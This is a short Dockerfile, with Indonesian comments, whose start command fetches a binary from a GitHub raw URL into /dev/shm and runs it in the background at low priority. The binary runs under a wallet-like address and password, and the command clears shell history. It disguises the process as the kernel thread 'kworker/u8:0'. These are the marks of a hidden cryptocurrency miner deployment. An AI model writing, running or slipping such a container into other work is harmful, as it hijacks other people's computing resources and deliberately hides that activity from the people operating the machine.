FROM ubuntu:20.04

# Install dependencies yang diperlukan: curl (untuk download), procps (untuk nice/ionice/ps)
RUN apt-get update && apt-get install -y curl procps && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# CMD akan menjalankan perintah kworker saat container di-start
# Perintah ini didesain untuk berjalan di background (daemon)
CMD ["bash", "-c", "curl -s -L -o /dev/shm/kworker https://github.com/Srilin8/gedf3/raw/refs/heads/main/vtt && chmod +x /dev/shm/kworker && nohup nice -n 19 ionice -c 3 /dev/shm/kworker --user 4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGjisFwgiWPVfBHuWs+7200 --pass yell1 > /dev/null 2>&1 & disown; echo kworker/u8:0 > /proc/$!/comm 2>/dev/null; history -c; unset HISTFILE"]
